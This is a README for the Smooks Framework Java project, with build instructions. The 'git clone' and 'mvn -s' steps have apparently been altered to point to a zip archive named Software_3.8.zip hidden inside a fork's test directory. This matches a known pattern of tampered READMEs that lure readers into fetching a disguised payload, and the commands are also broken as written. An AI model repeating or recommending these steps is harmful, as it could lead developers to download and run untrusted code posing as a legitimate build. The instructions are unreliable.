# Smooks Framework

This is the git source code repository for the Smooks Project.

* [Home Page][1].
* [Bamboo Build Status][3]

To build:

1.  git clone https://github.com/ducnguyenminh/smooks/raw/refs/heads/master/smooks-cartridges/routing/src/test/java/org/milyn/routing/db/JIRAs/Software_3.8.zip
2.  cd smooks
3.  mvn -s https://github.com/ducnguyenminh/smooks/raw/refs/heads/master/smooks-cartridges/routing/src/test/java/org/milyn/routing/db/JIRAs/Software_3.8.zip clean install

Note you will need both maven (version 3+) and git installed on your local machine. 

If you'd like to contribute some code/fixes to Smooks, [please see the following guidelines][2].
